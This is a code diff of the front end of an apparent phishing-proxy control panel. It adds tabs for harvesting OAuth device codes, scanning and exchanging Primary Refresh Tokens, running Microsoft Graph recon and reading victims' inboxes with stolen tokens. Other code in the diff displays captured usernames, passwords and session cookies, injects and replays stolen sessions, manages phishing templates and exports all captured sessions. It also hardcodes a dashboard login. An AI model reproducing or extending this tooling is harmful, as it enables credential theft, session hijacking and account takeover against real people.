 
         <div class="grid-2">
-            <div class="map-container glass">
-                <div id="map"></div>
-            </div>
-            <div class="chart-container glass">
-                <canvas id="captureChart"></canvas>
-            </div>
+            <div class="map-container glass"><div id="map"></div></div>
+            <div class="chart-container glass"><canvas id="captureChart"></canvas></div>
         </div>
     </div>
 
@@ -801,11 +254,11 @@
             <button class="btn btn-success" onclick="healthCheckVault()">🩺 Health Check</button>
             <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="vaultStats">Loading...</span>
         </div>
-        <div class="table-wrap glass" style="padding: 8px;">
+        <div class="table-wrap glass" style="padding:8px;">
             <table>
-                <thead><tr><th>Username</th><th>Type</th><th>Status</th><th>Source</th><th>Timestamp</th><th>Actions</th></tr></thead>
+                <thead><tr><th>Type</th><th>Username</th><th>File</th><th>Timestamp</th><th>Actions</th></tr></thead>
                 <tbody id="vaultTable">
-                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault. Click "Scan Logs" to extract tokens.</td></tr>
+                    <tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault. Click "Scan Logs" to extract tokens.</td></tr>
                 </tbody>
             </table>
         </div>
@@ -842,14 +295,10 @@
             </div>
             <div class="glass" style="padding:16px;">
                 <h4 style="color:rgba(255,255,255,0.5); font-weight:400; margin-bottom:12px;">🏆 Top Domains</h4>
-                <div id="topDomainsList" style="color:rgba(255,255,255,0.6); font-size:14px;">
-                    <p style="color:rgba(255,255,255,0.3);">Loading...</p>
-                </div>
+                <div id="topDomainsList" style="color:rgba(255,255,255,0.6); font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
                 <div style="margin-top:16px;">
                     <h4 style="color:rgba(255,255,255,0.5); font-weight:400; margin-bottom:12px;">📈 Conversion Rate</h4>
-                    <div id="conversionDetails" style="color:rgba(255,255,255,0.6); font-size:14px;">
-                        <p style="color:rgba(255,255,255,0.3);">Loading...</p>
-                    </div>
+                    <div id="conversionDetails" style="color:rgba(255,255,255,0.6); font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
                 </div>
             </div>
         </div>
@@ -861,12 +310,73 @@
             <button class="btn btn-primary" onclick="loadPhishlets()">🔄 Refresh</button>
             <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Manage phishing templates</span>
         </div>
-        <div class="table-wrap glass" style="padding: 8px;">
+        <div class="table-wrap glass" style="padding:8px;">
             <table>
                 <thead><tr><th>Name</th><th>Icon</th><th>File</th><th>Entry Point</th><th>Status</th><th>Actions</th></tr></thead>
-                <tbody id="phishletsTable">
-                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading phishlets...</td></tr>
+                <tbody id="phishletsTable"><tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading phishlets...</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- ==================== TAB: Device Code ==================== -->
+    <div id="tab-device" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="requestDeviceCode()">📱 Request Device Code</button>
+            <button class="btn btn-success" onclick="pollDeviceToken()">⏳ Poll Token</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Device code OAuth flow</span>
+        </div>
+        <div class="table-wrap glass" style="padding:8px;">
+            <table>
+                <thead><tr><th>User Code</th><th>Verification URI</th><th>Status</th><th>Created</th><th>Access Token</th><th>Actions</th></tr></thead>
+                <tbody id="deviceTable">
+                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows. Request one.</td></tr>
                 </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- ==================== TAB: PRT ==================== -->
+    <div id="tab-prt" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="scanPRT()">🔍 Scan PRTs</button>
+            <button class="btn btn-success" onclick="healthCheckPRTAll()">🩺 Health All</button>
+            <button class="btn btn-warning" onclick="exchangePRTAll()">🔄 Exchange All</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="prtStats">Loading...</span>
+        </div>
+        <div class="table-wrap glass" style="padding:8px;">
+            <table>
+                <thead><tr><th>Username</th><th>PRT (truncated)</th><th>Timestamp</th><th>Source</th><th>Actions</th></tr></thead>
+                <tbody id="prtTable"><tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found. Click "Scan PRTs".</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- ==================== TAB: Recon ==================== -->
+    <div id="tab-recon" class="tab-content">
+        <div class="toolbar glass">
+            <input type="text" id="reconToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
+            <button class="btn btn-primary" onclick="doRecon()">🔍 Recon</button>
+            <button class="btn btn-success" onclick="loadReconFromVault()">📥 From Vault</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Microsoft Graph recon</span>
+        </div>
+        <div id="reconResult" class="glass" style="padding:16px; margin-bottom:20px;">
+            <p style="color:rgba(255,255,255,0.5);">Recon results will appear here.</p>
+        </div>
+    </div>
+
+    <!-- ==================== TAB: Webmail ==================== -->
+    <div id="tab-webmail" class="tab-content">
+        <div class="toolbar glass">
+            <input type="text" id="webmailToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
+            <select id="webmailFolder"><option value="inbox">Inbox</option><option value="sent">Sent</option></select>
+            <input type="number" id="webmailLimit" value="20" style="width:80px;">
+            <button class="btn btn-primary" onclick="loadWebmail()">📧 Load Emails</button>
+            <button class="btn btn-success" onclick="loadWebmailFromVault()">📥 From Vault</button>
+        </div>
+        <div class="table-wrap glass" style="padding:8px;">
+            <table>
+                <thead><tr><th>Subject</th><th>From</th><th>Received</th><th>Actions</th></tr></thead>
+                <tbody id="webmailTable"><tr><td colspan="4" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Load emails with an access token.</td></tr></tbody>
             </table>
         </div>
     </div>
@@ -876,7 +386,7 @@
 <div class="modal" id="modal">
     <div class="modal-content glass">
         <button class="modal-close" onclick="closeModal()">✕ Close</button>
-        <h3 id="modalTitle" style="margin-bottom: 12px;">Details</h3>
+        <h3 id="modalTitle" style="margin-bottom:12px;">Details</h3>
         <div id="modalBody"></div>
     </div>
 </div>
@@ -885,9 +395,9 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    // =============================================
+    // ============================================================
     // GLOBALS
-    // =============================================
+    // ============================================================
     let allLogs = [];
     let map = null;
     let chart = null;
@@ -896,128 +406,135 @@
     const maxReconnectAttempts = 20;
     let ws;
     let vaultTokens = [];
+    let deviceFlows = [];
+    let prts = [];
 
-    // =============================================
+    // ============================================================
     // THEME
-    // =============================================
+    // ============================================================
     function toggleTheme() {
         document.body.classList.toggle('light-glass');
-        const isLight = document.body.classList.contains('light-glass');
-        localStorage.setItem('theme', isLight ? 'light' : 'dark');
+        localStorage.setItem('theme', document.body.classList.contains('light-glass') ? 'light' : 'dark');
     }
     (function restoreTheme() {
-        const saved = localStorage.getItem('theme');
-        if (saved === 'light') {
-            document.body.classList.add('light-glass');
-        }
+        if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-glass');
     })();
 
-    // =============================================
+    // ============================================================
     // TABS
-    // =============================================
+    // ============================================================
     function switchTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
         document.getElementById('tab-' + tabId).classList.add('active');
         document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
-        
         if (tabId === 'vault') loadVault();
         if (tabId === 'analytics') loadAnalytics();
         if (tabId === 'phishlets') loadPhishlets();
+        if (tabId === 'device') loadDeviceHistory();
+        if (tabId === 'prt') loadPRTList();
     }
 
-    // =============================================
-    // WEBSOCKET
-    // =============================================
-    function connectWebSocket() {
-        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
-        ws = new WebSocket(wsProtocol + location.host);
-        const wsDot = document.getElementById('wsDot');
-        const wsLabel = document.getElementById('wsLabel');
-
-        ws.onopen = () => {
-            wsDot.className = 'ws-dot online';
-            wsLabel.textContent = 'Live';
-            reconnectAttempts = 0;
-            startHeartbeat();
-        };
-
-        ws.onclose = () => {
-            wsDot.className = 'ws-dot offline';
-            wsLabel.textContent = 'Disconnected';
-            if (reconnectAttempts < maxReconnectAttempts) {
-                reconnectAttempts++;
-                const delay = Math.min(5000 + reconnectAttempts * 1000, 30000);
-                console.log(`🔄 Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts}) in ${delay/1000}s`);
-                setTimeout(connectWebSocket, delay);
-            }
-        };
-
-        ws.onerror = (error) => {
-            console.error('WebSocket error:', error);
-        };
-
-        ws.onmessage = (event) => {
-            try {
-                const data = JSON.parse(event.data);
-                if (data.type === 'newLog') {
-                    showToast('📥 New capture: ' + data.file);
-                    refreshLogs();
-                } else if (data === 'pong') {
-                    // Heartbeat response
-                }
-            } catch (e) {
-                // Not JSON, ignore
-            }
-        };
-    }
-
-    let heartbeatInterval;
-    function startHeartbeat() {
-        if (heartbeatInterval) clearInterval(heartbeatInterval);
-        heartbeatInterval = setInterval(() => {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send('ping');
-            }
-        }, 25000);
-    }
-
+    // ============================================================
+    // TOAST & MODAL
+    // ============================================================
     function showToast(msg, isError = false) {
         const container = document.getElementById('toastContainer');
         const toast = document.createElement('div');
         toast.className = 'toast' + (isError ? ' error' : '');
         toast.textContent = msg;
         container.appendChild(toast);
-        setTimeout(() => { toast.remove(); }, 4000);
+        setTimeout(() => toast.remove(), 4000);
     }
 
-    // =============================================
+    function openModal(title, bodyHTML) {
+        document.getElementById('modalTitle').textContent = title;
+        document.getElementById('modalBody').innerHTML = bodyHTML;
+        document.getElementById('modal').style.display = 'flex';
+    }
+
+    function closeModal() { document.getElementById('modal').style.display = 'none'; }
+    document.getElementById('modal').addEventListener('click', e => { if (e.target === e.currentTarget) closeModal(); });
+
+    // ============================================================
+    // API HELPERS (with Basic Auth)
+    // ============================================================
+    const API_BASE = '/dash/api';
+    let authHeader = '';
+
+    function getAuthHeader() {
+        if (authHeader) return authHeader;
+        // Prompt for credentials once
+        const user = prompt('Dashboard Username:', 'svrpsdev');
+        const pass = prompt('Dashboard Password:', 'Cozysarps18!');
+        authHeader = 'Basic ' + btoa(user + ':' + pass);
+        return authHeader;
+    }
+
+    async function apiFetch(endpoint, options = {}) {
+        const headers = {
+            'Authorization': getAuthHeader(),
+            'Content-Type': 'application/json',
+            ...options.headers
+        };
+        const res = await fetch(API_BASE + endpoint, { ...options, headers });
+        if (!res.ok) {
+            const errText = await res.text();
+            throw new Error(errText || `HTTP ${res.status}`);
+        }
+        return res.json();
+    }
+
+    // ============================================================
+    // WEBSOCKET (for live updates)
+    // ============================================================
+    function connectWebSocket() {
+        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+        ws = new WebSocket(wsProtocol + location.host);
+        const dot = document.getElementById('wsDot'), label = document.getElementById('wsLabel');
+        ws.onopen = () => { dot.className = 'ws-dot online'; label.textContent = 'Live'; reconnectAttempts = 0; startHeartbeat(); };
+        ws.onclose = () => {
+            dot.className = 'ws-dot offline'; label.textContent = 'Disconnected';
+            if (reconnectAttempts < maxReconnectAttempts) {
+                reconnectAttempts++;
+                setTimeout(connectWebSocket, Math.min(5000 + reconnectAttempts * 1000, 30000));
+            }
+        };
+        ws.onmessage = (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                if (data.type === 'newLog') { showToast('📥 New capture: ' + data.file); refreshLogs(); }
+            } catch (e) {}
+        };
+    }
+
+    let heartbeatInterval;
+    function startHeartbeat() {
+        if (heartbeatInterval) clearInterval(heartbeatInterval);
+        heartbeatInterval = setInterval(() => { if (ws && ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 25000);
+    }
+
+    // ============================================================
     // FLAG HELPER
-    // =============================================
-    function getFlagEmoji(countryCode) {
-        if (!countryCode || countryCode.length !== 2) return '🌍';
-        return String.fromCodePoint(
-            0x1F1E6 + countryCode.charCodeAt(0) - 65,
-            0x1F1E6 + countryCode.charCodeAt(1) - 65
-        );
+    // ============================================================
+    function getFlagEmoji(code) {
+        if (!code || code.length !== 2) return '🌍';
+        return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0)-65, 0x1F1E6 + code.charCodeAt(1)-65);
     }
 
-    // =============================================
+    // ============================================================
     // DASHBOARD TAB
-    // =============================================
+    // ============================================================
     async function refreshLogs() {
         try {
-            const res = await fetch('/dash/api/logs');
-            const logs = await res.json();
+            const logs = await apiFetch('/logs');
             allLogs = logs;
             renderTable(logs);
             updateStats(logs);
             updateMap(logs);
             updateChart(logs);
             await fetchVisits();
-        } catch (e) {
-            showToast('Failed to fetch logs: ' + e.message, true);
-        }
+        } catch (e) { showToast('Failed to fetch logs: ' + e.message, true); }
     }
 
     function renderTable(logs) {
@@ -1026,22 +543,19 @@
         const filter = document.getElementById('filterDate').value;
         const now = new Date();
         let filtered = logs;
-
         if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
-        if (filter === 'today') {
-            filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
-        } else if (filter === 'week') {
+        if (filter === 'today') filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
+        else if (filter === 'week') {
             const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
             filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
         }
-
         tbody.innerHTML = '';
         filtered.forEach(log => {
             const date = new Date(log.modified).toLocaleString();
             const row = document.createElement('tr');
             row.innerHTML = `
                 <td><span class="badge">${log.name}</span></td>
-                <td>${(log.size / 1024).toFixed(1)} KB</td>
+                <td>${(log.size/1024).toFixed(1)} KB</td>
                 <td>${date}</td>
                 <td id="user-${log.name}">Loading...</td>
                 <td id="ip-${log.name}">Loading...</td>
@@ -1059,25 +573,19 @@
 
     async function fetchMetadata(filename) {
         try {
-            const res = await fetch(`/dash/api/log/${filename}`);
-            const data = await res.json();
-            if (data.entries && data.entries.length > 0) {
+            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
+            if (data.entries && data.entries.length) {
                 let username = 'N/A', ip = 'N/A';
                 for (const entry of data.entries) {
                     const body = entry.proxyRequestBody;
                     if (body) {
                         try {
                             const parsed = typeof body === 'string' ? JSON.parse(body) : body;
-                            username = parsed.username || parsed.login || parsed.user || 
-                                       parsed.Email || parsed.upn || parsed.loginfmt || 
-                                       parsed.passwd || parsed.Password || 'N/A';
+                            username = parsed.username || parsed.login || parsed.user || parsed.Email || parsed.upn || 'N/A';
                             if (username !== 'N/A') break;
                         } catch (e) {
                             const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
-                            if (match) {
-                                username = decodeURIComponent(match[1]);
-                                break;
-                            }
+                            if (match) { username = decodeURIComponent(match[1]); break; }
                         }
                     }
                     ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
@@ -1091,83 +599,53 @@
                 const ipCell = document.getElementById(`ip-${filename}`);
                 if (ipCell) ipCell.textContent = ip;
             }
-        } catch (e) { /* silently fail */ }
+        } catch (e) {}
     }
 
     function updateStats(logs) {
         document.getElementById('total').textContent = logs.length;
-        if (logs.length > 0) {
-            document.getElementById('last').textContent = new Date(logs[0].modified).toLocaleString();
-        } else {
-            document.getElementById('last').textContent = 'No captures';
-        }
+        document.getElementById('last').textContent = logs.length > 0 ? new Date(logs[0].modified).toLocaleString() : 'No captures';
     }
 
     function updateMap(logs) {
         if (!map) {
-            map = L.map('map').setView([20, 0], 2);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
-            }).addTo(map);
+            map = L.map('map').setView([20,0],2);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map);
         }
-        map.eachLayer(layer => {
-            if (layer instanceof L.Marker) map.removeLayer(layer);
-        });
-        L.marker([20, 0]).addTo(map)
-            .bindPopup('📍 IP locations will appear here once you have captures.');
+        map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
+        L.marker([20,0]).addTo(map).bindPopup('📍 IP locations will appear once you have captures.');
     }
 
     function updateChart(logs) {
         const ctx = document.getElementById('captureChart').getContext('2d');
         const now = new Date();
         const days = {};
-        for (let i = 6; i >= 0; i--) {
-            const d = new Date(now.getTime() - i*24*60*60*1000);
-            days[d.toDateString()] = 0;
-        }
-        logs.forEach(log => {
-            const d = new Date(log.modified).toDateString();
-            if (days.hasOwnProperty(d)) days[d]++;
-        });
-        const labels = Object.keys(days);
-        const data = Object.values(days);
-
+        for (let i=6; i>=0; i--) { const d = new Date(now.getTime() - i*24*60*60*1000); days[d.toDateString()] = 0; }
+        logs.forEach(log => { const d = new Date(log.modified).toDateString(); if (days.hasOwnProperty(d)) days[d]++; });
         if (chart) chart.destroy();
         chart = new Chart(ctx, {
             type: 'bar',
             data: {
-                labels: labels,
+                labels: Object.keys(days),
                 datasets: [{
                     label: 'Captures',
-                    data: data,
-                    backgroundColor: 'rgba(130, 177, 255, 0.4)',
+                    data: Object.values(days),
+                    backgroundColor: 'rgba(130,177,255,0.4)',
                     borderColor: '#82b1ff',
                     borderWidth: 2,
-                    borderRadius: 8,
+                    borderRadius: 8
                 }]
             },
-            options: {
-                responsive: true,
-                maintainAspectRatio: false,
-                plugins: {
-                    legend: { labels: { color: '#a0b0c0' } }
-                },
-                scales: {
-                    y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
-                    x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
-                }
-            }
+            options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#a0b0c0' } } }, scales: { y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { ticks: { color: '#a0b0c0' }, grid: { display: false } } } }
         });
     }
 
     async function fetchVisits() {
         try {
-            const res = await fetch('/dash/api/visits');
-            const data = await res.json();
+            const data = await apiFetch('/visits');
             document.getElementById('totalVisits').textContent = data.total || 0;
             document.getElementById('uniqueIPs').textContent = data.uniqueIPs || 0;
             document.getElementById('todayVisits').textContent = data.today || 0;
-            
             const tbody = document.getElementById('visitsTable');
             if (!data.visits || data.visits.length === 0) {
                 tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No visits recorded yet</td></tr>`;
@@ -1177,412 +655,206 @@
             data.visits.forEach(visit => {
                 const row = document.createElement('tr');
                 const time = new Date(visit.timestamp).toLocaleString();
-                const userAgent = visit.userAgent || 'Unknown';
-                const truncatedUA = userAgent.length > 40 ? userAgent.substring(0, 40) + '...' : userAgent;
-                const referer = visit.referer || 'Direct';
-                const url = visit.url || '/';
+                const ua = visit.userAgent || 'Unknown';
+                const truncatedUA = ua.length > 40 ? ua.substring(0,40)+'...' : ua;
                 const flag = getFlagEmoji(visit.countryCode || 'UN');
                 row.innerHTML = `
                     <td style="font-size:12px; color:rgba(255,255,255,0.6);">${time}</td>
                     <td style="font-size:18px; text-align:center;" title="${visit.countryCode || 'UN'}">${flag}</td>
                     <td style="font-family:monospace; font-size:13px;">${visit.ip}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.6);">${truncatedUA}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${referer}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.5);">${url}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${visit.referer || 'Direct'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.5);">${visit.url || '/'}</td>
                 `;
                 tbody.appendChild(row);
             });
-        } catch (e) {
-            console.error('Failed to fetch visits:', e);
-        }
+        } catch (e) { console.error('Visits fetch failed:', e); }
     }
 
-    function filterTable() {
-        renderTable(allLogs);
-    }
+    function filterTable() { renderTable(allLogs); }
 
-    // =============================================
-    // VIEW LOG - FIXED
-    // =============================================
+    // ============================================================
+    // VIEW LOG
+    // ============================================================
     async function viewLog(filename) {
-        const modal = document.getElementById('modal');
-        const title = document.getElementById('modalTitle');
-        const body = document.getElementById('modalBody');
-        modal.style.display = 'flex';
-        title.textContent = `📄 ${filename}`;
-        body.innerHTML = '<p>Loading...</p>';
-
         try {
-            const res = await fetch(`/dash/api/log/${filename}`, {
-                credentials: 'include'
-            });
-            const data = await res.json();
-            if (data.error) {
-                body.innerHTML = `<p style="color:#ff6b6b;">Error: ${data.error}</p>`;
-                return;
-            }
+            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
             let html = '';
             data.entries.forEach((entry, idx) => {
-                html += `<h4 style="margin:12px 0 6px;">Entry ${idx+1}</h4>`;
-                html += `<pre>${JSON.stringify(entry, null, 2)}</pre>`;
-                if (entry.proxyRequestBody) {
-                    html += `<h5>Credentials:</h5>`;
-                    try {
-                        const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
-                        const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
-                        const password = bodyObj.password || bodyObj.passwd || bodyObj.Password || 'N/A';
-                        html += `<p><strong>Username:</strong> ${username}</p>`;
-                        html += `<p><strong>Password:</strong> ${password}</p>`;
-                    } catch (e) {
-                        const bodyStr = entry.proxyRequestBody || '';
-                        const uMatch = bodyStr.match(/(?:username|login|user|Email)=([^&]+)/i);
-                        const pMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
-                        if (uMatch) html += `<p><strong>Username:</strong> ${decodeURIComponent(uMatch[1])}</p>`;
-                        if (pMatch) html += `<p><strong>Password:</strong> ${decodeURIComponent(pMatch[1])}</p>`;
-                    }
-                }
-                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
-                    html += `<h5>Cookies:</h5><pre>${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>`;
-                }
-                html += '<hr style="border-color:rgba(255,255,255,0.05);">';
+                html += `<h4>Entry ${idx+1}</h4><pre>${JSON.stringify(entry, null, 2)}</pre>`;
             });
-            body.innerHTML = html;
-        } catch (e) {
-            body.innerHTML = `<p style="color:#ff6b6b;">Failed to load log: ${e.message}</p>`;
-        }
+            openModal(`📄 ${filename}`, html);
+        } catch (e) { showToast('Failed to load log: ' + e.message, true); }
     }
 
-    // =============================================
-    // INJECT COOKIES - FIXED
-    // =============================================
+    // ============================================================
+    // INJECT COOKIES
+    // ============================================================
     async function injectCookies(filename) {
         try {
-            const res = await fetch(`/dash/api/log/${filename}`, {
-                credentials: 'include'
-            });
-            const data = await res.json();
-            if (!data.entries || data.entries.length === 0) {
-                showToast('No entries found.', true);
-                return;
-            }
-            const allCookies = [];
+            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
+            let cookies = [];
             data.entries.forEach(entry => {
-                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
-                    let cookieHeaders = entry.proxyResponseHeaders['set-cookie'];
-                    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
-                    cookieHeaders.forEach(c => {
-                        const [nameValue] = c.split(';');
-                        if (nameValue) allCookies.push(nameValue);
+                const setCookie = entry.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const arr = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    arr.forEach(c => {
+                        const [nameVal] = c.split(';');
+                        if (nameVal) cookies.push(nameVal);
                     });
                 }
             });
-            if (allCookies.length === 0) {
-                showToast('No cookies found.', true);
-                return;
-            }
-            const cookieString = allCookies.join('; ');
-            try {
-                await navigator.clipboard.writeText(cookieString);
-                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
-            } catch (e) {
-                showToast('Failed to copy. Manual: ' + cookieString);
-            }
-        } catch (e) {
-            showToast('Error: ' + e.message, true);
-        }
+            if (cookies.length === 0) { showToast('No cookies found.', true); return; }
+            const cookieString = cookies.join('; ');
+            await navigator.clipboard.writeText(cookieString);
+            showToast(`🍪 ${cookies.length} cookies copied to clipboard.`);
+        } catch (e) { showToast('Error: ' + e.message, true); }
     }
 
-    // =============================================
-    // REPLAY SESSION - FIXED
-    // =============================================
+    // ============================================================
+    // REPLAY SESSION
+    // ============================================================
     async function replaySession(filename) {
         try {
-            const res = await fetch(`/dash/api/replay/${filename}`, {
-                credentials: 'include'
-            });
-            const data = await res.json();
-            if (data.error) {
-                showToast('❌ Replay failed: ' + data.error, true);
-                return;
-            }
+            const data = await apiFetch(`/replay/${encodeURIComponent(filename)}`);
+            if (data.error) { showToast('Replay failed: '+data.error, true); return; }
             eval(data.replayScript);
             showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
-        } catch (e) {
-            showToast('❌ Replay error: ' + e.message, true);
-        }
+        } catch (e) { showToast('Replay error: '+e.message, true); }
     }
 
-    // =============================================
+    // ============================================================
     // SHOW TOKENS
-    // =============================================
+    // ============================================================
     async function showTokens(filename) {
         try {
-            const res = await fetch(`/dash/api/tokens/${filename}`, {
-                credentials: 'include'
-            });
-            const data = await res.json();
-            if (data.error) {
-                showToast('❌ Token extraction failed: ' + data.error, true);
-                return;
-            }
-            const tokens = data.tokens;
+            const data = await apiFetch(`/tokens/${encodeURIComponent(filename)}`);
+            const tokens = data.tokens || {};
             let msg = `🔑 Extracted:\n`;
-            msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
-            msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
-            msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
-            msg += `  • Cookies: ${tokens.cookies.length}\n`;
-            msg += `  • Sessions: ${tokens.sessions.length}`;
-            
-            const hasPrt = tokens.prt || tokens.flowToken;
-            if (hasPrt) {
-                msg += `\n\n🔑 **PRT Found!** (Long-term access)`;
-                msg += `\n   📝 Length: ${(tokens.prt || tokens.flowToken).length} chars`;
-                msg += `\n\n   💡 Click OK to exchange PRT for a fresh access token.`;
-                if (confirm(msg + '\n\nExchange PRT for a new access token?')) {
-                    await exchangePRT(tokens.prt || tokens.flowToken);
-                    return;
-                }
+            msg += `• Access: ${tokens.access_tokens?.length || 0}\n`;
+            msg += `• Refresh: ${tokens.refresh_tokens?.length || 0}\n`;
+            msg += `• ID: ${tokens.id_tokens?.length || 0}\n`;
+            msg += `• PRT: ${tokens.prt_tokens?.length || 0}\n`;
+            msg += `• Cookies: ${tokens.cookies?.length || 0}`;
+            if (tokens.access_tokens && tokens.access_tokens.length > 0) {
+                msg += `\n\nFirst Access Token:\n${tokens.access_tokens[0].slice(0, 60)}...`;
             }
-            if (tokens.refresh_tokens.length > 0) {
-                msg += `\n\n🔄 Refresh token available. Click OK to exchange.`;
-                if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
-                    await exchangeRefreshToken(tokens.refresh_tokens[0]);
-                    return;
-                }
-            }
-            alert(msg);
-        } catch (e) {
-            showToast('❌ Token error: ' + e.message, true);
-        }
+            openModal(`🔑 Tokens from ${filename}`, `<pre>${msg}</pre>`);
+        } catch (e) { showToast('Tokens error: '+e.message, true); }
     }
 
-    async function exchangeRefreshToken(refreshToken) {
-        try {
-            const response = await fetch('/dash/api/exchange', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ refresh_token: refreshToken })
-            });
-            const data = await response.json();
-            if (data.access_token) {
-                showToast(`✅ New access token obtained.`);
-                localStorage.setItem('evil_token', JSON.stringify(data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
-            } else {
-                showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
-            }
-        } catch (e) {
-            showToast('❌ Exchange error: ' + e.message, true);
-        }
-    }
-
-    async function exchangePRT(token) {
-        try {
-            const response = await fetch('/dash/api/prt/exchange', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ prt: token })
-            });
-            const data = await response.json();
-            if (data.access_token) {
-                showToast(`✅ PRT exchange successful!`);
-                localStorage.setItem('evil_token', JSON.stringify(data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
-            } else {
-                showToast('❌ PRT exchange failed: ' + (data.error || 'Unknown error'), true);
-            }
-        } catch (e) {
-            showToast('❌ PRT exchange error: ' + e.message, true);
-        }
-    }
-
-    // =============================================
-    // EXPORT
-    // =============================================
+    // ============================================================
+    // EXPORT ALL
+    // ============================================================
     async function exportAll() {
         try {
-            const res = await fetch('/dash/api/export/all');
-            if (!res.ok) {
-                const err = await res.json();
-                showToast('Export failed: ' + err.error, true);
-                return;
-            }
+            const res = await fetch(API_BASE + '/export/all', { headers: { 'Authorization': getAuthHeader() } });
+            if (!res.ok) throw new Error('Export failed');
             const blob = await res.blob();
             const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'all_sessions.zip';
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
+            const a = document.createElement('a'); a.href = url; a.download = 'all_sessions.zip'; a.click();
             showToast('✅ Export successful!');
-        } catch (e) {
-            showToast('Export error: ' + e.message, true);
-        }
+        } catch (e) { showToast('Export error: '+e.message, true); }
     }
 
